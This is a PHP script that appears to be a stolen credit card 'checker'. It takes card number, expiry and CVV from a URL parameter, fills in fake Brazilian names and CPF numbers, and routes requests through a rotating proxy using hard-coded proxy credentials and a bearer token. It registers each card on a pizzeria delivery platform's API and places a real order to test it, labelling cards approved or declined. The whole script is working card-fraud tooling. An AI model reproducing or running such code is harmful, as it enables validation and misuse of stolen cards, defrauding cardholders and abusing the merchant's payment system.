<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}


if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }

// ========================================  ARRAYS RANDOMS..  ========================================


$cpf = array("64604473811", "50953732894", "39673765839", "21629860867", "78202171890", "78705131804", "11945001887", "00181920840", "57238048809");
$generator_cpf = $cpf[array_rand($cpf)];

$nomes2 = array("Marcos Vinicius Almeida", "Roberto Luiz Silva", "Luis Carlos Ferreira Junior", "Wellington Norberto Salles");
$all_nome = $nomes2[array_rand($nomes2)];

// ========================================  ARRAYS RANDOMS..  ========================================


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://private.accon.app/v1/user/62f86bfb978b3e0038eb1cc6/cards");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json, text/plain, */*',
'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmY4NmJmYjk3OGIzZTAwMzhlYjFjYzYiLCJlbWFpbCI6InNlcnZlcmJyY29tcHV0ZXIyMDMyQGdtYWlsLmNvbSIsImlhdCI6MTY2MDQ0NzczOX0.mU9IBpIcmy5I3scAXD0Z87cPiecKYkbT4FDqIxkcnjM',
'content-type: application/json',
'origin: https://delivery.abarepizzarias.com.br',
'referer: https://delivery.abarepizzarias.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83',
'x-network-id: 5ed16dc3d092a8004caba0b4'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, '{"cardNumber":"'.$cc.'","securityCode":"'.$cvv.'","holderName":"'.$all_nome.'","expirationDate":"'.$mes.'/'.$ano.'","document":"'.$generator_cpf.'","birthday":"1990-04-26T03:00:00.000Z","type":"credit_card","brand":""}');
$meupiru = curl_exec($ini);
$token = puxar($meupiru, '"_id":"','"' , 1);



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://private.accon.app/v1/order");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: application/json, text/plain, */*',
'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MmY4NmJmYjk3OGIzZTAwMzhlYjFjYzYiLCJlbWFpbCI6InNlcnZlcmJyY29tcHV0ZXIyMDMyQGdtYWlsLmNvbSIsImlhdCI6MTY2MDQ0NzczOX0.mU9IBpIcmy5I3scAXD0Z87cPiecKYkbT4FDqIxkcnjM',
'content-type: application/json',
'origin: https://delivery.abarepizzarias.com.br',
'referer: https://delivery.abarepizzarias.com.br/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83',
'x-network-id: 5ed16dc3d092a8004caba0b4'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, '{"notes":"","version":"3.4.2","sessionId":"89081d70-13c5-4be6-ba39-51a8540ee773","online":true,"card":"'.$token.'","payment":"5c51aeba22c5d6596c5ac4b0","source":"desktop","address":"62f86cd4978b3e0038eb1e35","payedValue":77.94,"itens":[{"id":"62977702d9c21f0038ff3cf5","name":"Refrigerante 2 litros","quantity":3,"modifiers":[{"id":"62977703d9c21f0038ff3d0f","price":{"starterPrice":0,"actualPrice":12.99,"originalPrice":0},"name":"Coca cola Original 2L","quantity":2,"group":"62977703d9c21f0038ff3d0e","higherPrice":false}],"notes":"","total":77.94}],"document":"","network":"5ed16dc3d092a8004caba0b4","delivery":true}');
echo $meupiruzao = curl_exec($ini);


$retorno = puxar($meupiruzao, '"msg":"','"');


if(strpos($meupiruzao, '"verified":true')!== false){

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> Transacao success » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

else{

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

?>
